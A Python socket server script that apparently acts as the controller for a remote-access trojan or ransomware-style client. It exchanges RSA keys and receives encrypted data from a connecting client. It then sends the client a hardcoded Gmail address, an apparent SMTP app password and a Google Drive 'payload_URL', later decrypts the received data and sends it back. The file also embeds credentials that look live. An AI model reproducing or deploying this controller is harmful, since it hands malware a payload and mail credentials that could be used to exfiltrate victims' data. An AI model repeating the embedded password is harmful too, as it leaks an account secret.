from utils import *
# old ip
# SERVER_IP = '192.168.8.100'
SERVER_IP = '127.0.0.1'
SERVER_PORT = 5678

exported_public_key, exported_private_key = generateRSAKeys()
key_pair = exported_public_key.decode().replace("\n", "") + "\n" + exported_private_key.decode().replace("\n", "")
encrypted_ascii = ""
saveKey(key_pair, "keyPair.key")

with socket.socket(socket.AF_INET , socket.SOCK_STREAM) as s:
    
    s.bind((SERVER_IP, SERVER_PORT))
    print('Server is listening')
    s.listen(1)
    conn,addr = s.accept()
    print(f'Connection accepted from :{addr}')
    with conn:
        
        while(True):
            conn.send(exported_public_key)
            encrypted_ascii =  conn.recv(1024)
            print("public key:\n",exported_public_key)
            print("private key:\n",exported_private_key)
            print("encrtpred ascii:\n",encrypted_ascii)
            
            # decrypted_ascii = decrypt_with_RSA(encrypted_ascii, exported_private_key)
            # print("decrypted ascii:\n",decrypted_ascii)
            credentials = {}
            credentials['smtp_email'] = "gpt.rats@gmail.com"
            credentials['smtp_password'] = "mmtxdnfzzvckqrhw"
            payload_URL = "https://drive.google.com/file/d/19yVYnI6jbrRainkkQyNiV9DBmUa1EGpd/view?usp=sharing"
            conn.send(credentials['smtp_email'].encode() + b"\n" + credentials['smtp_password'].encode() + b"\n" + payload_URL.encode())
            break
        print("Server connection closed")

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((SERVER_IP, SERVER_PORT))
        print('Server is listening 2')

        s.listen(1)
        conn, addr = s.accept()
        print(f'Connection accepted from: {addr}')

        with conn:
            while True:
                # data = conn.recv(1024)
                # if not data:
                #     break

                decrypted_ascii = decrypt_with_RSA(encrypted_ascii, exported_private_key)
                print("decrypted ascii:\n",decrypted_ascii)
                # Process the received data here
                # Example: Print the received data
                # print(f'Received data: {data.decode()}')
                # Example: Echo the received data back to the client
                conn.send(decrypted_ascii.encode())
                break
        print('Server connection closed   2')

def start_server():
    SERVER_IP = '127.0.0.1'  # localhost
    SERVER_PORT = 12345  # choose any available port

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((SERVER_IP, SERVER_PORT))
        print('Server is listening')

        s.listen(1)
        conn, addr = s.accept()
        print(f'Connection accepted from: {addr}')

        with conn:
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                # Process the received data here
                # Example: Print the received data
                print(f'Received data: {data.decode()}')
                # Example: Echo the received data back to the client
                conn.sendall(data)
        print('Server connection closed')

# start_server()  # Start the server in one thread/process

